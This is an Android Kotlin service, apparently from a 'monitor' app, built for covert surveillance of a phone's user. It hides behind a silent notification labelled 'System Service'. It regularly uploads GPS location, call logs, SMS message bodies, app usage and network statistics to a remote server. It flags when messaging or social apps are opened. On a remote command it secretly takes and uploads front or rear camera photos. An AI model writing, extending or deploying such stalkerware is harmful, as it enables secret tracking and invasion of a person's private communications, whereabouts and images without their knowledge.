package com.smartcrm.monitor

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.ImageReader
import android.net.TrafficStats
import android.os.*
import android.provider.CallLog
import android.provider.Telephony
import android.util.Base64
import android.app.usage.UsageStatsManager
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors

class MonitorService : Service() {

    private val executor = Executors.newCachedThreadPool()
    private val handler  = Handler(Looper.getMainLooper())
    private var lastRxBytes = 0L
    private var lastTxBytes = 0L

    // ============================================
    // SERVICE START
    // ============================================
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        startForeground(1, buildNotification())

        // Send online status
        executor.execute { sendStatus("online") }

        // Start all loops
        startActivityLoop()
        startLocationLoop()
        startCallLogLoop()
        startSmsLoop()
        startNetworkLoop()
        startCommandPollLoop()

        return START_STICKY
    }

    override fun onBind(intent: Intent?) = null

    override fun onDestroy() {
        super.onDestroy()
        executor.execute { sendStatus("offline") }
        handler.removeCallbacksAndMessages(null)
    }

    // ============================================
    // NOTIFICATION (required for foreground)
    // ============================================
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "monitor_ch", "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, "monitor_ch")
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
    }

    // ============================================
    // STATUS
    // ============================================
    private fun sendStatus(status: String) {
        try {
            val data = JSONObject()
            data.put("type", "pc_status")
            data.put("status", status)
            data.put("timestamp", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
            ApiClient.post("api.php", data, this)
        } catch (e: Exception) {}
    }

    // ============================================
    // ACTIVITY LOOP — app usage + screen status
    // ============================================
    private fun startActivityLoop() {
        val runnable = object : Runnable {
            override fun run() {
                executor.execute {
                    try {
                        val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
                        val end   = System.currentTimeMillis()
                        val start = end - Config.ACTIVITY_INTERVAL
                        val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end)

                        var topApp = ""
                        var topTime = 0L
                        stats?.forEach { stat ->
                            if (stat.totalTimeInForeground > topTime) {
                                topTime = stat.totalTimeInForeground
                                topApp  = stat.packageName
                            }
                        }

                        // Check alert apps
                        checkAlerts(topApp)

                        val data = JSONObject()
                        data.put("type", "activity")
                        data.put("status", "active")
                        data.put("active_app", topApp)
                        data.put("active_window", "")
                        data.put("active_url", "")
                        ApiClient.post("api.php", data, this@MonitorService)
                    } catch (e: Exception) {}
                }
                handler.postDelayed(this, Config.ACTIVITY_INTERVAL)
            }
        }
        handler.post(runnable)
    }

    // ============================================
    // LOCATION LOOP
    // ============================================
    private fun startLocationLoop() {
        val runnable = object : Runnable {
            override fun run() {
                executor.execute { sendLocation() }
                handler.postDelayed(this, Config.LOCATION_INTERVAL)
            }
        }
        handler.post(runnable)
    }

    private fun sendLocation() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var loc: Location? = null

            try { loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (e: Exception) {}
            if (loc == null) {
                try { loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (e: Exception) {}
            }

            if (loc != null) {
                val data = JSONObject()
                data.put("type", "location")
                data.put("latitude", loc.latitude)
                data.put("longitude", loc.longitude)
                data.put("accuracy", loc.accuracy)
                data.put("speed", loc.speed)
                ApiClient.post("api.php", data, this)
            }
        } catch (e: Exception) {}
    }

    // ============================================
    // CALL LOG
    // ============================================
    private fun startCallLogLoop() {
        var lastCallTime = System.currentTimeMillis() - 86400000L // Last 24hr

        val runnable = object : Runnable {
            override fun run() {
                executor.execute {
                    try {
                        val cursor = contentResolver.query(
                            CallLog.Calls.CONTENT_URI,
                            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE, CallLog.Calls.CACHED_NAME),
                            "${CallLog.Calls.DATE} > ?",
                            arrayOf(lastCallTime.toString()),
                            "${CallLog.Calls.DATE} DESC"
                        )
                        cursor?.use {
                            while (it.moveToNext()) {
                                val number   = it.getString(0) ?: ""
                                val type     = it.getInt(1)
                                val duration = it.getLong(2)
                                val date     = it.getLong(3)
                                val name     = it.getString(4) ?: ""
                                val callType = when(type) {
                                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                    CallLog.Calls.MISSED_TYPE   -> "missed"
                                    else -> "unknown"
                                }
                                val data = JSONObject()
                                data.put("type", "call_log")
                                data.put("number", number)
                                data.put("name", name)
                                data.put("call_type", callType)
                                data.put("duration", duration)
                                data.put("call_date", date)
                                ApiClient.post("api.php", data, this@MonitorService)
                            }
                        }
                    } catch (e: Exception) {}
                }
                handler.postDelayed(this, Config.CALL_LOG_INTERVAL)
            }
        }
        handler.post(runnable)
    }

    // ============================================
    // SMS LOG
    // ============================================
    private fun startSmsLoop() {
        var lastSmsTime = System.currentTimeMillis() - 86400000L

        val runnable = object : Runnable {
            override fun run() {
                executor.execute {
                    try {
                        val cursor = contentResolver.query(
                            Telephony.Sms.CONTENT_URI,
                            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.TYPE, Telephony.Sms.DATE),
                            "${Telephony.Sms.DATE} > ?",
                            arrayOf(lastSmsTime.toString()),
                            "${Telephony.Sms.DATE} DESC LIMIT 50"
                        )
                        cursor?.use {
                            while (it.moveToNext()) {
                                val address = it.getString(0) ?: ""
                                val body    = it.getString(1) ?: ""
                                val type    = it.getInt(2)
                                val date    = it.getLong(3)
                                val smsType = if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "received" else "sent"

                                val data = JSONObject()
                                data.put("type", "sms_log")
                                data.put("address", address)
                                data.put("body", body.take(500))
                                data.put("sms_type", smsType)
                                data.put("sms_date", date)
                                ApiClient.post("api.php", data, this@MonitorService)
                            }
                        }
                    } catch (e: Exception) {}
                }
                handler.postDelayed(this, Config.SMS_INTERVAL)
            }
        }
        handler.post(runnable)
    }

    // ============================================
    // NETWORK USAGE
    // ============================================
    private fun startNetworkLoop() {
        lastRxBytes = TrafficStats.getTotalRxBytes()
        lastTxBytes = TrafficStats.getTotalTxBytes()

        val runnable = object : Runnable {
            override fun run() {
                executor.execute {
                    try {
                        val rx = TrafficStats.getTotalRxBytes()
                        val tx = TrafficStats.getTotalTxBytes()
                        val recvMb = (rx - lastRxBytes) / 1024.0 / 1024.0
                        val sentMb = (tx - lastTxBytes) / 1024.0 / 1024.0
                        lastRxBytes = rx
                        lastTxBytes = tx

                        val data = JSONObject()
                        data.put("type", "network")
                        data.put("recv_mb", String.format("%.2f", recvMb).toDouble())
                        data.put("sent_mb", String.format("%.2f", sentMb).toDouble())
                        data.put("total_mb", String.format("%.2f", recvMb + sentMb).toDouble())
                        ApiClient.post("api.php", data, this@MonitorService)
                    } catch (e: Exception) {}
                }
                handler.postDelayed(this, Config.ACTIVITY_INTERVAL)
            }
        }
        handler.post(runnable)
    }

    // ============================================
    // ALERTS — app opened
    // ============================================
    private val ALERT_APPS = listOf(
        "com.whatsapp", "com.facebook.katana", "com.google.android.youtube",
        "com.instagram.android", "com.twitter.android", "com.netflix.mediaclient",
        "org.telegram.messenger", "com.tiktok"
    )
    private var lastAlertApp = ""

    private fun checkAlerts(packageName: String) {
        if (packageName.isEmpty()) return
        for (app in ALERT_APPS) {
            if (packageName.contains(app) || app.contains(packageName)) {
                if (lastAlertApp != packageName) {
                    lastAlertApp = packageName
                    try {
                        val data = JSONObject()
                        data.put("type", "alert")
                        data.put("alert_type", "app_opened")
                        data.put("description", "Android: $packageName opened")
                        ApiClient.post("api.php", data, this)
                    } catch (e: Exception) {}
                }
                return
            }
        }
        lastAlertApp = ""
    }

    // ============================================
    // COMMAND POLL — screenshot/webcam
    // ============================================
    private fun startCommandPollLoop() {
        val runnable = object : Runnable {
            override fun run() {
                executor.execute {
                    try {
                        val response = ApiClient.get("screenshot_cmd.php", mapOf("action" to "poll"), this@MonitorService)
                        val cmd = response?.optString("command") ?: ""

                        when (cmd) {
                            "screenshot" -> {
                                val cmdId = response?.optInt("command_id") ?: 0
                                takeScreenshot(cmdId)
                            }
                            "webcam" -> {
                                val cmdId = response?.optInt("command_id") ?: 0
                                takeCameraPhoto(cmdId, useFront = true)
                            }
                        }
                    } catch (e: Exception) {}
                }
                handler.postDelayed(this, Config.POLL_INTERVAL)
            }
        }
        handler.post(runnable)
    }

    // ============================================
    // SCREENSHOT (Android screenshot needs root - send blank with message)
    // ============================================
    private fun takeScreenshot(cmdId: Int) {
        // Android screenshot without root not possible - send camera instead
        takeCameraPhoto(cmdId, useFront = false)
    }

    // ============================================
    // CAMERA PHOTO
    // ============================================
    private fun takeCameraPhoto(cmdId: Int, useFront: Boolean) {
        try {
            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = manager.cameraIdList.firstOrNull { id ->
                val facing = manager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING)
                if (useFront) facing == CameraCharacteristics.LENS_FACING_FRONT
                else facing == CameraCharacteristics.LENS_FACING_BACK
            } ?: manager.cameraIdList.firstOrNull() ?: return

            val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)

            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val buffer = image.planes[0].buffer
                    val bytes  = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

                    val data = JSONObject()
                    data.put("command_id", cmdId)
                    data.put("image", b64)
                    data.put("image_type", if (useFront) "webcam" else "screenshot")
                    ApiClient.post("screenshot_cmd.php?action=upload", data, this)
                } finally {
                    image.close()
                    imageReader.close()
                }
            }, handler)

            val callback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        captureRequest.addTarget(imageReader.surface)

                        camera.createCaptureSession(
                            listOf(imageReader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    session.capture(captureRequest.build(), null, handler)
                                    handler.postDelayed({ camera.close() }, 2000)
                                }
                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    camera.close()
                                }
                            }, handler
                        )
                    } catch (e: Exception) { camera.close() }
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }

            manager.openCamera(cameraId, callback, handler)
        } catch (e: Exception) {}
    }
}
